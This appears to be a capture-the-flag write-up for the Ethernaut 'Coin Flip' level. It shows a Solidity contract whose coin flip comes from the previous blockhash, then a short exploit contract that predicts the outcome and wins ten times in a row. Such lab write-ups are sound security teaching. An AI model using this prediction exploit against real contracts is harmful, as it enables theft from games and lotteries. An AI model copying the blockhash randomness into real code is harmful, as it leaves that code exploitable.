# Coin Flip

>This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

>Things that might help :
> 1. See the "?" page above in the top right corner menu, section "Beyond the console"


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

`There’s no true randomness on Ethereum blockchain, only random generators that are considered “good enough”.`

The random number generation is one of the serious pitfalls of blockchains due to deterministic nature. Some examples of methods which are used to generate pseudo randomness are `block.timestamp`, `block.number` etc.

In this challenge, the random coin flip is generated by `block.number`.

This block number is easily accessible, therefore we can regenerate the result of the coinflip and feed this result to flip function to correctly guess and succeed in incrementing consecutiveWins.

The exploit script for this challenge can be written like this, 

```solidity

contract exploit {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip cf;

    constructor(address addr ){
        cf = CoinFlip(addr);
    }

    function makeGuess() public {
      uint256 blockValue = uint256(blockhash(block.number - 1));
      uint256 coinFlip = blockValue / FACTOR;
      bool side = coinFlip == 1 ? true : false;
      cf.flip(side);
    }
}
```
When we call the makeGuess function, consecutiveWins gets incremented by 1. We can check this through the browser console.

<img width="311" alt="ethernaut-1" src="https://github.com/blueh4mster/Ethernaut-writeups/assets/102573660/4b678f6d-d70c-4216-96a5-9fc0ca4827d9">

We call this makeGuess function 10 times to increment consecutiveWins by 10 and then submit the instance.

(This exploit script can be deployed in remix IDE using Injected Web3 Provider MetaMask. Instance address of the challenge to be fed to the constructor.)
